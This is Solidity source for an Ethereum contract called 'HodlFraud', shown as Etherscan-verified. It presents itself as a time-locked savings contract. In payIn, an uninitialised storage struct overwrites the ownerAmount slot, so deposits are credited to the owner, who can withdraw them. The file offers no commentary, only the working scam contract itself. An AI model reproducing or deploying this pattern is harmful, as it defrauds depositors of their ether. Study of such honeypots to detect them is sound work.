/**
 *Submitted for verification at Etherscan.io on 2021-09-09
*/

pragma solidity ^0.4.18;

contract HodlFraud {
    
    uint public ownerAmount;
    uint public numberOfPayouts;
    address public owner;
    
    struct HoldRecord {
        uint amount;
        uint unlockTime;
    }
    
    mapping (address => HoldRecord) public balance;
    
    function HodlFraud () public payable {//constructor
        owner = msg.sender;
        ownerAmount = msg.value;
    }
    
    function payIn(uint holdTime) public payable {
        require(msg.value > 0);
        HoldRecord newRecord;
        newRecord.amount += msg.value;
        newRecord.unlockTime = now + holdTime;
        balance[msg.sender] = newRecord;
    }
    
    function withdraw () public {
        require(balance[msg.sender].unlockTime < now && balance[msg.sender].amount > 0);
        msg.sender.transfer(balance[msg.sender].amount);
        balance[msg.sender].amount = 0;
        numberOfPayouts++;
    } 
    
    function ownerWithdrawall () public {
        require(msg.sender == owner && ownerAmount > 0);
        msg.sender.transfer(ownerAmount);
        ownerAmount = 0;
    }
}